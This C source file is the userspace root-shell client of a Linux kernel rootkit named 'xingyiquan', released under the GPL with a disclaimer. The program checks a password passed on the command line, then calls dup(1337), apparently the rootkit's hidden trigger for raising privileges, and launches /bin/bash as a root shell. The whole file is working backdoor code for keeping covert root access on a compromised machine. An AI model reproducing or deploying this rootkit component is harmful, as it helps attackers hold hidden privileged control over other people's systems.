/*
 * userspace root shell for xingyiquan lkm rootkit
 *  (c) Copyright by RingLayer All Rights Reserved 
 * Developed by Sw0rdm4n
 * 
 * Official Website : www.ringlayer.net
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *
DISCLAIMER !!!
Author takes no responsibility for any abuse of this software. 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "xingyi_userspace_functions.h"
#include "xingyi_userspace_config.h"

int main(int argc, char *argv[])
{
	char *input;

	input = n_malloc(17);
	snprintf(input, 16, "%s", argv[1]);	
	if (strcmp(input, rootshell_password) == 0) {
		dup(1337);
		system("/bin/bash");
	}	
	else
		printf("\n[-] wrong password !\n");

	return 0;
}
